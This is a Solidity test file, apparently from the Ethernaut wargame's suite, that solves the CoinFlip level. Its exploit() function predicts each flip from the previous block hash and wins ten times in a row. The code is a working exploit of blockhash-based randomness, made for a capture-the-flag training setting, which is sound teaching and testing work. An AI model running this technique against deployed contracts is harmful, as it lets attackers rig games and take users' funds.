// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {CoinFlip} from "../levels/CoinFlip/CoinFlip.sol";
import {CoinFlipFactory} from "../levels/CoinFlip/CoinFlipFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract CoinFlipTest is LevelTest {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip private level;

    constructor() {
        levelFactory = new CoinFlipFactory();
    }

    function testCoinFlip() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = CoinFlip(levelAddress);

        assertEq(level.consecutiveWins(), 0);
    }

    function exploit() internal override {
        vm.startPrank(player);

        for (uint256 i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            level.flip(side);
            utils.mineBlocks(1);
        }

        vm.stopPrank();
    }
}
